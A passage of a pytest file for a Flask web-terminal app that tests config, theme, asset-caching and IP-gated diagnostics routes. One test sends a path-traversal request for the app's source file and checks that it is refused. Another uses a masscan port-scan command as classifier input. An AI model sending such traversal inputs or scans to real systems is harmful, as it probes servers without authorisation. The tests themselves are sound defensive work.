            data = json.loads(client.get("/status").data)
        assert data["redis"] == "down"

    def test_server_time_is_ms_epoch(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert isinstance(data["server_time"], int)
        # Any plausible ms-epoch timestamp in 2026 fits in 13 digits.
        assert 1e12 < data["server_time"] < 1e13


# ── /config ───────────────────────────────────────────────────────────────────

class TestConfigRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/config")
        assert resp.status_code == 200

    def test_contains_expected_keys(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in (
            "app_name", "project_readme", "prompt_username", "prompt_domain", "default_theme",
            "max_tabs", "max_output_lines", "high_volume_output_line_threshold",
            "high_volume_output_status_interval_lines", "evidence_package_max_mb",
            "evidence_package_max_uncompressed_mb", "evidence_package_max_artifacts",
            "workspace_enabled", "interactive_pty_commands",
            "scheduler_default_timezone",
            "tour_chapters",
        ):
            assert key in data
        assert "share_redaction_enabled" in data
        assert "share_redaction_rules" in data

    def test_interactive_pty_commands_reflect_registry(self):
        client = get_client()
        registry = {
            "commands": [{
                "root": "watcher",
                "interactive": {
                    "mode": "pty",
                    "trigger_flag": "--live",
                    "default_rows": 35,
                    "default_cols": 120,
                    "max_runtime_seconds": 180,
                    "allow_input": False,
                    "requires_args": False,
                },
            }],
            "pipe_helpers": [],
        }
        with mock.patch("services.commands.registry.load_commands_registry", return_value=registry):
            data = json.loads(client.get("/config").data)

        assert data["interactive_pty_commands"] == [{
            "root": "watcher",
            "trigger_flag": "--live",
            "default_rows": 35,
            "default_cols": 120,
            "max_runtime_seconds": 180,
            "allow_input": False,
            "requires_args": False,
            "transcript_mode": "final_frame",
            "input_safety": "no_input",
        }]

    def test_workspace_menu_affordances_follow_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled_body = client.get("/").get_data(as_text=True)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled_body = client.get("/").get_data(as_text=True)

        assert 'data-action="workspace"' not in disabled_body
        assert 'data-menu-action="workspace"' not in disabled_body
        assert 'data-action="workspace"' in enabled_body
        assert 'data-menu-action="workspace"' in enabled_body

    def test_max_tabs_is_int(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        assert isinstance(data["max_tabs"], int)

    def test_contains_timeout_and_welcome_keys(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("command_timeout_seconds",
                    "welcome_char_ms", "welcome_jitter_ms",
                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
                    "welcome_sample_count", "welcome_status_labels",
                    "welcome_hint_interval_ms", "welcome_hint_rotations",
                    "tour_enabled", "tour_version", "tour_chapter_count"):
            assert key in data, f"missing key: {key}"

    def test_all_new_keys_are_ints(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("command_timeout_seconds",
                    "welcome_char_ms", "welcome_jitter_ms",
                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
                    "welcome_sample_count", "welcome_hint_interval_ms",
                    "welcome_hint_rotations", "tour_version", "tour_chapter_count"):
            assert isinstance(data[key], int), f"{key} should be int, got {type(data[key])}"
        assert isinstance(data["tour_enabled"], bool)
        assert isinstance(data["welcome_status_labels"], list)
        assert all(isinstance(item, str) for item in data["welcome_status_labels"])

    def test_command_timeout_reflects_cfg(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"command_timeout_seconds": 300}):
            data = json.loads(client.get("/config").data)
        assert data["command_timeout_seconds"] == 300

    def test_prompt_identity_reflects_cfg(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"prompt_username": "ops", "prompt_domain": "darklab"}):
            data = json.loads(client.get("/config").data)
        assert data["prompt_username"] == "ops"
        assert data["prompt_domain"] == "darklab"

    def test_project_readme_is_constant(self):
        client = get_client()
        with mock.patch("config.PROJECT_README", "https://example.invalid/README.md"):
            data = json.loads(client.get("/config").data)
        assert data["project_readme"] == "https://example.invalid/README.md"

    def test_welcome_timing_reflects_cfg(self):
        client = get_client()
        overrides = {
            "welcome_char_ms": 25,
            "welcome_jitter_ms": 5,
            "welcome_post_cmd_ms": 400,
            "welcome_inter_block_ms": 1000,
            "welcome_first_prompt_idle_ms": 1800,
            "welcome_post_status_pause_ms": 300,
            "welcome_sample_count": 4,
            "welcome_status_labels": ["CONFIG", "CACHE", "READY"],
            "welcome_hint_interval_ms": 3000,
            "welcome_hint_rotations": 1,
        }
        with mock.patch.dict("config.CFG", overrides):
            data = json.loads(client.get("/config").data)
        for key, val in overrides.items():
            assert data[key] == val, f"{key}: expected {val}, got {data[key]}"

    def test_tour_metadata_reflects_cfg_and_visible_chapters(self):
        client = get_client()
        tour_payload = {
            "version": 7,
            "chapters": [{"id": "one"}, {"id": "two"}],
        }
        with mock.patch.dict("config.CFG", {"tour_enabled": True}):
            with mock.patch("blueprints.content.load_tour", return_value=tour_payload) as load:
                data = json.loads(client.get("/config").data)

        load.assert_called_once()
        assert data["tour_enabled"] is True
        assert data["tour_version"] == 7
        assert data["tour_chapters"] == tour_payload["chapters"]
        assert data["tour_chapter_count"] == 2

    def test_command_timeout_defaults_to_one_hour(self):
        # Default config keeps long-running commands bounded to an hour
        client = get_client()
        with mock.patch.dict("config.CFG", {"command_timeout_seconds": 3600}):
            data = json.loads(client.get("/config").data)
        assert data["command_timeout_seconds"] == 3600

    def test_diag_enabled_false_when_cidrs_empty(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_diag_enabled_false_when_client_ip_not_in_cidrs(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["10.0.0.0/8"]}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_diag_enabled_true_when_client_ip_in_cidrs(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is True

    def test_diag_enabled_uses_trusted_forwarded_for_when_present(self):
        client = get_client(use_forwarded_for=True)
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
            "trusted_proxy_cidrs": ["127.0.0.1/32"],
        }):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is True

    def test_diag_enabled_ignores_forwarded_for_from_untrusted_peer(self):
        client = get_client(use_forwarded_for=True)
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
            "trusted_proxy_cidrs": ["10.0.0.0/8"],
        }):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_share_redaction_rules_reflect_cfg(self):
        client = get_client()
        rules = [
            {"label": "bearer", "pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": "i"},
        ]
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": rules,
        }):
            data = json.loads(client.get("/config").data)
        assert data["share_redaction_enabled"] is True
        assert any(rule["label"] == "bearer token" for rule in data["share_redaction_rules"])
        assert data["share_redaction_rules"][-1] == rules[0]

    def test_share_redaction_rules_empty_when_disabled(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": False,
            "share_redaction_rules": [
                {"label": "custom", "pattern": "internal", "replacement": "[custom]"},
            ],
        }):
            data = json.loads(client.get("/config").data)
        assert data["share_redaction_enabled"] is False
        assert data["share_redaction_rules"] == []


# ── /themes ──────────────────────────────────────────────────────────────────

class TestThemesRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/themes")
        assert resp.status_code == 200

    def test_response_has_current_and_themes(self):
        client = get_client()
        data = json.loads(client.get("/themes").data)
        assert "current" in data
        assert "themes" in data
        assert isinstance(data["themes"], list)

    def test_includes_named_theme_variants(self):
        client = get_client()
        data = json.loads(client.get("/themes").data)
        themes = {theme["name"]: theme for theme in data["themes"]}
        assert "apricot_sand" in themes
        assert "olive_grove" in themes
        assert "darklab_obsidian" in themes
        assert "emerald_obsidian" in themes
        assert "charcoal_steel" in themes
        assert "dark" not in themes
        assert "light" not in themes
        assert themes["apricot_sand"]["label"] == "Apricot Sand"
        assert themes["olive_grove"]["label"] == "Olive Grove"
        assert themes["darklab_obsidian"]["label"] == "Darklab Obsidian"
        assert themes["emerald_obsidian"]["label"] == "Emerald Obsidian"
        assert themes["charcoal_steel"]["label"] == "Charcoal Steel"
        assert themes["apricot_sand"]["group"] == "Warm Light"
        assert themes["olive_grove"]["group"] == "Warm Light"
        assert themes["darklab_obsidian"]["group"] == "Dark Neon"
        assert themes["emerald_obsidian"]["group"] == "Dark Neon"
        assert themes["apricot_sand"]["filename"] == "apricot_sand.yaml"
        assert themes["olive_grove"]["filename"] == "olive_grove.yaml"
        assert themes["darklab_obsidian"]["filename"] == "darklab_obsidian.yaml"
        assert themes["emerald_obsidian"]["filename"] == "emerald_obsidian.yaml"

    def test_default_theme_is_exposed_as_filename(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"default_theme": "darklab_obsidian.yaml"}):
            data = json.loads(client.get("/config").data)
        assert data["default_theme"] == "darklab_obsidian.yaml"

    def test_default_theme_filename_selects_variant(self):
        client = get_client(use_forwarded_for=False)
        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "darklab_obsidian"
        assert data["current"]["filename"] == "darklab_obsidian.yaml"
        assert data["current"]["label"] == "Darklab Obsidian"
        assert data["current"]["group"] == "Dark Neon"
        assert data["current"]["sort"] == 0

    def test_pref_theme_name_cookie_selects_variant(self):
        client = get_client(use_forwarded_for=False)
        client.set_cookie("pref_theme_name", "apricot_sand")
        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "apricot_sand"
        assert data["current"]["label"] == "Apricot Sand"
        assert data["current"]["group"] == "Warm Light"

    def test_empty_registry_falls_back_to_built_in_dark_theme(self, monkeypatch):
        client = get_client(use_forwarded_for=False)
        monkeypatch.setitem(config.CFG, "default_theme", "theme_missing.yaml")
        monkeypatch.setitem(shell_app.get_theme_entry.__globals__, "THEME_REGISTRY_MAP", {})
        monkeypatch.setitem(shell_app.get_theme_entry.__globals__, "THEME_REGISTRY", [])

        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "dark"
        assert data["current"]["source"] == "built-in"
        assert data["current"]["group"] == "Other"
        assert data["current"]["sort"] == 0
        assert data["themes"] == []


# ── /vendor assets ───────────────────────────────────────────────────────────

class TestVendorAssets:
    @staticmethod
    def _assert_immutable_asset_cache(resp):
        assert resp.headers.get("Cache-Control") == "public, max-age=31536000, immutable"

    def test_ansi_up_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/ansi_up.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type
        self._assert_immutable_asset_cache(resp)

    def test_jspdf_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/jspdf.umd.min.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type
        self._assert_immutable_asset_cache(resp)

    def test_xterm_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/xterm.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type
        self._assert_immutable_asset_cache(resp)

    def test_xterm_fit_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/xterm-addon-fit.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type
        self._assert_immutable_asset_cache(resp)

    def test_xterm_css_is_served(self):
        client = get_client()
        resp = client.get("/vendor/xterm.css")
        assert resp.status_code == 200
        assert "text/css" in resp.content_type
        self._assert_immutable_asset_cache(resp)

    def test_built_css_bundle_is_served_with_immutable_cache_header(self):
        client = get_client()
        built_path = shell_app._asset_bundle_entry("app")["path"]
        resp = client.get(built_path)
        assert resp.status_code == 200
        assert "text/css" in resp.content_type
        body = resp.get_data(as_text=True)
        assert "/vendor/fonts/" not in body
        assert re.search(
            r"url\('/static/build/font-jetbrainsmono-400\.[a-f0-9]{12}\.ttf'\)",
            body,
        )
        self._assert_immutable_asset_cache(resp)
        vendor_path = shell_app._load_asset_manifest()["static_assets"]["/vendor/jspdf.umd.min.js"]["path"]
        vendor_resp = client.get(vendor_path)
        assert vendor_resp.status_code == 200
        assert "javascript" in vendor_resp.content_type
        self._assert_immutable_asset_cache(vendor_resp)

    def test_font_route_serves_committed_file(self, tmp_path, monkeypatch):
        client = get_client()
        font_dir = tmp_path / "fonts"
        font_dir.mkdir()
        (font_dir / "JetBrainsMono-400.ttf").write_bytes(b"font bytes")
        monkeypatch.setattr(shell_assets, "_FONT_DIR", font_dir)

        resp = client.get("/vendor/fonts/JetBrainsMono-400.ttf")
        assert resp.status_code == 200
        assert resp.data == b"font bytes"
        self._assert_immutable_asset_cache(resp)

    def test_font_route_rejects_unknown_or_traversal_paths(self):
        client = get_client()

        resp = client.get("/vendor/fonts/UnknownFont.ttf")
        assert resp.status_code == 404

        resp = client.get("/vendor/fonts/../../app.py")
        assert resp.status_code == 404


# ── /diag ─────────────────────────────────────────────────────────────────────

class TestDiagRoute:
    """Operator diagnostics endpoint — IP-gated, returns 404 when unconfigured."""

    def _allowed_client(self):
        """Test client whose remote_addr (127.0.0.1) matches the allowed CIDR."""
        shell_app.app.config["TESTING"] = True
        # No X-Forwarded-For — we want remote_addr to be 127.0.0.1 (Werkzeug default)
        return shell_app.app.test_client()

    def _record_audit_event(
        self,
        *,
        event_type: str = "project.link",
        target_type: str = "project",
        target_id: str | None = None,
        actor_member_id: str = "tmem_diag_audit",
        actor_display_name: str = "Diag Operator",
        team_id: str = "",
        correlation_id: str = "",
        created: str = "2026-06-06T12:00:00+00:00",
    ) -> str:
        from services.audit.recorder import record_event

        audit_target_id = target_id or f"proj-diag-audit-{uuid.uuid4().hex}"
        with db_connect() as conn:
            audit_id = record_event(
                event_type,
                target_type=target_type,
                target_id=audit_target_id,
                session_id="diag-audit-owner",
                team_id=team_id,
                actor_member_id=actor_member_id,
                actor_role="owner",
                actor_display_name=actor_display_name,
                project_id=audit_target_id if target_type == "project" else "",
                correlation_id=correlation_id,
                client_ip="127.0.0.1",
                details={"project_id": audit_target_id, "source": "test"},
                conn=conn,
                created=created,
            )
            conn.commit()
        assert audit_id
        return audit_target_id

    def test_returns_404_when_cidrs_empty(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            with mock.patch.object(logging.getLogger("shell"), "warning") as mock_warn:
                resp = client.get("/diag")
        assert resp.status_code == 404
        mock_warn.assert_called_once()
        event = mock_warn.call_args[0][0]
        assert event == "DIAG_DENIED"
        assert mock_warn.call_args[1]["extra"]["ip"] == "127.0.0.1"
        assert mock_warn.call_args[1]["extra"]["allowed_cidrs"] == []

    def test_returns_404_when_cidrs_not_set(self):
        client = self._allowed_client()
        cfg_without_key = {k: v for k, v in config.CFG.items() if k != "diagnostics_allowed_cidrs"}
        with mock.patch.dict("config.CFG", cfg_without_key, clear=True):
            resp = client.get("/diag")
        assert resp.status_code == 404

    def test_returns_404_when_client_ip_not_in_cidrs(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["10.0.0.0/8"]}):
            resp = client.get("/diag")
        assert resp.status_code == 404

    def test_returns_200_when_client_ip_in_cidrs(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag")
        assert resp.status_code == 200

    def test_bundle_mode_renders_diag_css_bundles(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "asset_bundle_mode": "bundle",
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
        }):
            body = client.get("/diag").get_data(as_text=True)
        assert re.search(r'href="/static/build/app\.[a-f0-9]{12}\.css"', body)
        assert re.search(r'href="/static/build/terminal-export\.[a-f0-9]{12}\.css"', body)
        assert re.search(r'href="/static/build/diag\.[a-f0-9]{12}\.css"', body)
        assert '/static/css/core/base.css?v=' not in body
        assert '/static/css/terminal_export.css?v=' not in body
        assert '/static/css/diag.css?v=' not in body

    def test_response_has_expected_top_level_keys(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert set(data.keys()) >= {"app", "config", "db", "redis", "broker", "pty", "assets", "ai", "tools"}

    def test_app_section_has_version_and_name(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "app_name": "test shell",
        }):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["app"]["name"] == "test shell"
        assert isinstance(data["app"]["version"], str)

    def test_config_section_contains_operational_keys(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        cfg = data["config"]
        for key in ("rate_limit_enabled", "command_timeout_seconds", "max_output_lines",
                    "high_volume_output_line_threshold", "high_volume_output_status_interval_lines",
                    "interactive_pty_input_max_bytes", "interactive_pty_control_poll_seconds",
                    "persist_full_run_output", "permalink_retention_days",
                    "share_redaction_enabled", "custom_redaction_rule_count",
                    "ai_enabled", "ai_provider", "ai_model", "ai_max_queue_depth"):
            assert key in cfg, f"missing config key: {key}"

    def test_pty_section_contains_operator_metrics(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
            body = client.get("/diag").get_data(as_text=True)
        pty = data["pty"]
        for key in (
            "active",
            "completed_count",
            "average_seconds",
            "p95_seconds",
            "input_bytes",
            "dropped_input_bytes",
            "control_queue_depth",
        ):
            assert key in pty
        assert "Interactive PTY" in body

    def test_classifier_inspector_reports_line_metadata(self):
        client = self._allowed_client()
        query = {
            "format": "json",
            "classifier_command": "masscan -p 1-1000 192.168.1.3",
            "classifier_line": "rate:  0.10-kpps, 49.90% done,   0:00:09 remaining, found=2",
        }
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag", query_string=query).data)
            fast_data = json.loads(client.get(
                "/diag/classifier-inspector",
                query_string={key: value for key, value in query.items() if key != "format"},
            ).data)
            with mock.patch(
                "blueprints.assets.classifier_drift_report",
                return_value={
                    "ok": True,
                    "runs_scanned": 0,
                    "lines_sampled": 0,
                    "truncated_runs": 0,
                    "issue_count": 0,
                    "buckets": [],
                    "runs": [],
                },
            ) as drift_report:
                drift_data = json.loads(client.get(
                    "/diag/classifier-drift",
                    query_string={"runs": "2", "lines": "10", "root": "nmap"},
                ).data)
            body = client.get(
                "/diag",
                query_string={key: value for key, value in query.items() if key != "format"},
            ).get_data(as_text=True)

        inspector = data["classifier_inspector"]
        assert fast_data == inspector
        assert drift_data["ok"] is True
        assert drift_data["runs_scanned"] == 0
        drift_report.assert_called_once()
        assert drift_report.call_args.kwargs["run_limit"] == "2"
        assert drift_report.call_args.kwargs["line_limit"] == "10"
        assert drift_report.call_args.kwargs["command_root_filter"] == "nmap"
        assert inspector["submitted"] is True
        assert inspector["result"]["kind"] == "info"
        assert inspector["result"]["role"] == "progress"
        assert inspector["result"]["command_root"] == "masscan"
        assert inspector["result"]["signals"] == []
        assert "Classifier Inspector" in body
        assert "Classifier Drift Report" in body
        assert "progress" in body
        assert "diag-classifier-form" in body
        assert "diag-drift-form" in body
        assert body.index("Classifier Inspector") < body.index("Database Details")
        assert body.index("Classifier Drift Report") < body.index("Database Details")

        from services.diagnostics.classifier_drift import classifier_drift_report
        from services.runs.output_model import line_event_from_legacy

        class DriftRows:
            def fetchall(self):
                return [{
                    "id": "run-drift",
                    "session_id": "sess-drift",
                    "command": "masscan -p 80 192.168.1.3",
                    "run_kind": "external",
                    "output": "[]",
                    "output_preview": "",
                    "preview_truncated": False,
                    "full_output_available": False,
                    "full_output_truncated": False,
                    "rel_path": None,
                }]

        class DriftConn:
            def execute(self, *_args, **_kwargs):
                return DriftRows()

        stored_event = line_event_from_legacy(
            "rate:  0.10-kpps, 49.90% done,   0:00:09 remaining, found=2",
            "",
            line_index=0,
        )
        with mock.patch(
            "services.diagnostics.classifier_drift.load_run_output_events_for_run",
            return_value=mock.Mock(events=[stored_event]),
        ):
            report = classifier_drift_report(DriftConn(), run_limit=5, line_limit=10)
        assert report["runs_scanned"] == 1
        assert report["lines_sampled"] == 1
        drift_buckets = report["buckets"]
        assert isinstance(drift_buckets, list)
        assert any(
            isinstance(bucket, dict) and bucket["key"] == "metadata_changed"
            for bucket in drift_buckets
        )

    def test_every_config_key_belongs_to_a_group(self):
        """Drift guard: every key emitted into result['config'] must be
        listed in exactly one `_DIAG_CONFIG_GROUPS` entry, otherwise it
        renders nowhere on the page."""
        grouped: set[str] = set()
        seen_twice: set[str] = set()
        for _label, keys in shell_assets._DIAG_CONFIG_GROUPS:
            for key in keys:
                if key in grouped:
                    seen_twice.add(key)
                grouped.add(key)
        assert not seen_twice, f"config keys appear in multiple groups: {seen_twice}"
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        emitted = set(data["config"].keys())
        missing_from_groups = emitted - grouped
        assert not missing_from_groups, (
            f"config keys not in any group (would be invisible on /diag): {missing_from_groups}"
        )

    def test_html_response_renders_config_group_labels(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        for label, _keys in shell_assets._DIAG_CONFIG_GROUPS:
            assert label in body, f"config group label '{label}' not rendered"
        assert "diag-config-group-label" in body
        assert "AI Assists" in body
        assert "data-diag-ai-test-form" in body

    def test_ai_test_route_runs_prompt_and_rate_limits_repeats(self):
        client = self._allowed_client()
        shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT.clear()
        shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT.update({
            "198.51.100.10": 900.0,
            "198.51.100.11": 980.0,
        })
        payload = {"ok": True, "payload": {"status": "ok", "message": "pong"}}
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.ai_run_test_prompt", return_value=payload) as test_prompt:
                with mock.patch("blueprints.assets.time.monotonic", side_effect=[999.0, 1000.0, 1001.0, 1001.0]):
                    first = client.post("/diag/ai-test")
                    second = client.post("/diag/ai-test")

        assert first.status_code == 200
        assert first.get_json() == payload
        assert second.status_code == 429
        assert "198.51.100.10" not in shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT
        assert shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT["198.51.100.11"] == 980.0
        test_prompt.assert_called_once()
        shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT.clear()

    def test_ai_test_route_logs_provider_failures(self):
        from services.ai.client import AIClientError

        client = self._allowed_client()
        shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT.clear()
        cfg = {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "ai_provider": "openai_compatible",
            "ai_model": "Llama-3.1-8B-Instruct",
        }
        with mock.patch.dict("config.CFG", cfg):
            with mock.patch(
                "blueprints.assets.ai_run_test_prompt",
                side_effect=AIClientError("ai_unavailable", "provider down", status=503),
            ):
                with mock.patch.object(shell_assets.log, "warning") as warning:
                    resp = client.post("/diag/ai-test")

        assert resp.status_code == 502
        assert resp.get_json()["error_code"] == "ai_unavailable"
        warning.assert_called_once_with(
            "AI_DIAG_TEST_FAILED",
            extra={
                "ip": "127.0.0.1",
                "provider": "openai_compatible",
                "model": "Llama-3.1-8B-Instruct",
                "error_code": "ai_unavailable",
                "status": 503,
            },
        )
        shell_assets._DIAG_AI_TEST_LAST_BY_CLIENT.clear()

    def test_db_section_ok_and_has_counts(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["db"]["ok"] is True
        assert isinstance(data["db"]["runs"], int)
        assert isinstance(data["db"]["snapshots"], int)
        project_workspace = data["db"]["project_workspace"]
        for key in ("projects", "artifacts", "findings", "notes", "packages"):
            assert isinstance(project_workspace[key], int)

    def test_db_section_error_on_db_failure(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db down")):
                data = json.loads(client.get("/diag?format=json").data)
        assert data["db"]["ok"] is False
        assert "error" in data["db"]

    def test_redis_section_reflects_client_presence(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert "configured" in data["redis"]

    def _fake_redis_client(self, *, ping_exc=None, scan_keys=None, info_data=None,
                           sismember_map=None, get_map=None, dbsize=None,
                           xlen_map=None):
        """Build a MagicMock that mimics the redis-py methods _diag_redis_stats uses."""
        scan_keys = scan_keys or {}
        info_data = info_data or {}
        sismember_map = sismember_map or {}
        get_map = get_map or {}
        xlen_map = xlen_map or {}

        fake = mock.MagicMock()
        if ping_exc is None:
            fake.ping.return_value = True
        else:
            fake.ping.side_effect = ping_exc
        fake.dbsize.return_value = dbsize if dbsize is not None else sum(
            len(keys) for keys in scan_keys.values()
        )

        def scan(cursor=0, match=None, count=None):  # noqa: ARG001
            keys = scan_keys.get(match, [])
            return (0, list(keys))
        fake.scan.side_effect = scan
        fake.xlen.side_effect = lambda key: xlen_map.get(key, 0)
        fake.get.side_effect = lambda key: get_map.get(key)
        fake.sismember.side_effect = lambda key, member: bool(
            member in sismember_map.get(key, set())
        )
        fake.info.side_effect = lambda section: info_data.get(section, {})
        return fake

    def test_redis_stats_present_when_client_reachable(self):
        client = self._allowed_client()
        run_id = "r1"
        meta_payload = json.dumps({"session_id": "s1", "run_id": run_id})
        fake = self._fake_redis_client(
            scan_keys={
                "runstream:*":     [f"runstream:{run_id}"],
                "proc:*":          [f"proc:{run_id}"],
                "procmeta:*":      [f"procmeta:{run_id}"],
                "sessionprocs:*":  ["sessionprocs:s1"],
            },
            xlen_map={f"runstream:{run_id}": 17},
            get_map={f"procmeta:{run_id}": meta_payload, f"proc:{run_id}": "123"},
            sismember_map={"sessionprocs:s1": {run_id}},
            info_data={
                "memory":      {"used_memory_human": "1.2M", "used_memory_peak_human": "2.0M",
                                "maxmemory_human": "0", "mem_fragmentation_ratio": 1.05},
                "persistence": {"aof_enabled": 1, "rdb_last_save_time": int(time.time()) - 90,
                                "rdb_changes_since_last_save": 4},
                "stats":       {"evicted_keys": 0, "expired_keys": 12},
                "clients":     {"connected_clients": 3, "rejected_connections": 0},
            },
        )
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                data = json.loads(client.get("/diag?format=json").data)
        stats = data["redis"]["stats"]
        assert data["redis"]["ok"] is True
        assert isinstance(stats["ping_ms"], (int, float))
        assert stats["dbsize"] == 4
        names = {ns["name"]: ns for ns in stats["namespaces"]}
        assert names["runstream"]["count"] == 1
        assert names["procmeta"]["count"] == 1
        assert "capped" not in names["runstream"]
        assert stats["stream_length"]["max"] == 17
        assert stats["orphans"] == {"probed": 1, "orphaned": 0}
        assert stats["memory"]["used"] == "1.2M"
        assert stats["persistence"]["aof_enabled"] is True
        assert stats["persistence"]["rdb_last_save_human"].endswith(" ago")
        assert stats["evicted_keys"] == 0
        assert stats["clients"]["connected"] == 3
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                body = client.get("/diag").get_data(as_text=True)
        assert "RDB saved" in body
        assert "changes since save" in body
        assert "AOF on" not in body
        assert "AOF off" not in body

    def test_redis_stats_absent_when_ping_fails(self):
        client = self._allowed_client()
        fake = self._fake_redis_client(ping_exc=ConnectionError("redis unreachable"))
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                data = json.loads(client.get("/diag?format=json").data)
        assert data["redis"]["ok"] is False
        assert "redis unreachable" in data["redis"]["error"]
        assert "stats" not in data["redis"]

    def test_redis_orphan_count_flags_dangling_procmeta(self):
        client = self._allowed_client()
        # procmeta:r2 references session s2, but sessionprocs:s2 has no member r2 → orphan.
        fake = self._fake_redis_client(
            scan_keys={
                "runstream:*":    [],
                "proc:*":         [],
                "procmeta:*":     ["procmeta:r2"],
                "sessionprocs:*": ["sessionprocs:s2"],
            },
            get_map={"procmeta:r2": json.dumps({"session_id": "s2", "run_id": "r2"})},
            sismember_map={"sessionprocs:s2": set()},
        )
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(shell_assets, "redis_client", fake):
                data = json.loads(client.get("/diag?format=json").data)
        assert data["redis"]["stats"]["orphans"] == {"probed": 1, "orphaned": 1, "cleaned": 1}
        fake.delete.assert_called_once_with("procmeta:r2", "proc:r2")
        fake.srem.assert_called_once_with("sessionprocs:s2", "r2")

    def test_redis_namespace_count_marks_capped_when_scan_hits_limit(self):
        client = self._allowed_client()
